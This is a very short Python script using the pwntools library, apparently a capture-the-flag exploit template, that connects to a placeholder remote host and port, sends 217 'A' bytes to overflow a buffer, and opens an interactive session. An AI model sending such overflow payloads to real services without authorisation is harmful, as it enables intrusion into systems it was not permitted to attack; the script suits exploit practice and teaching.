from pwn import *

# setup process
p = remote("IP", PORT)

# payload 
payload = b'A' * 217

# send payload
p.sendline(payload)
p.interactive()